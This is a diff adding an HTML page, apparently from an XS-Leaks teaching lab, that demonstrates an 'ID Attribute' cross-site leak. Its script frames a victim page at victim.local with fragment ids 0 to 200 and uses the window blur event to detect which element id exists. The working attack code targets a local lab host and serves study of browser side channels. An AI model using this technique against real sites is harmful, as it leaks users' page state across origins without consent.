@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSLL - Attacker - ID Attribute</title>
+    <script>
+        // Listen to onblur event
+        onblur = () => {
+            if (stopLoop) return;  // If attack is not running, return
+            alert(`Element ID "${currentId}" found!`);
+            stopLoop = true;
+        }
+
+        let stopLoop = true;
+        let currentId;
+
+        function removeIframesAndText() {
+            document.getElementById('currentid').textContent = '0';
+            const iframes = document.querySelectorAll('iframe');
+            iframes.forEach(ifr => ifr.remove());
+        }
+
+        async function startAttack() {
+            removeIframesAndText(); // Remove all existing iframes
+            stopLoop = false;
+            for (let id = 0; id <= 200; id++) {
+                if (stopLoop) break;  // Stop the loop if flag is set
+
+                currentId = id;  // Update currentId with the loop value
+                document.getElementById('currentid').textContent = currentId; // Display the current id
+
+                let ifr = document.createElement('iframe');
+                // Update the iframe src with the current id
+                ifr.src = `http://victim.local:27182/xs-leaks/id-attribute.html#${id}`;
+                document.body.appendChild(ifr);
+
+                // Wait for a brief period to allow for focus shift
+                await new Promise(resolve => setTimeout(resolve, 100));
+
+                // If loop has not stopped, remove the iframe
+                if (!stopLoop) {
+                    document.body.removeChild(ifr);
+                }
+            }
+        }
+    </script>
+</head>
+
+<body>
+    <h1>ID Attribute</h1>
+    <ul>
+        <li><a href="../index.html">Home</a></li>
+    </ul>
+
+    <h2>Introduction</h2>
+    <p>This page will help demonstrate an ID Attribute attack.</p>
+    <h2>Attack</h2>
+    <p>Start the attack by clicking the button below.</p>
+    <p>The attack will leak the element id present on the <a
+            href="http://victim.local:27182/xs-leaks/id-attribute.html">victim</a>.</p>
+    <p>Don't press anywhere/lose focus while the attack runs! Otherwise it won't return a correct result.</p>
+    
+    <button onclick="startAttack()">Start Attack</button>
+    <div id=currentid>0</div>
+</body>
+
+</html>
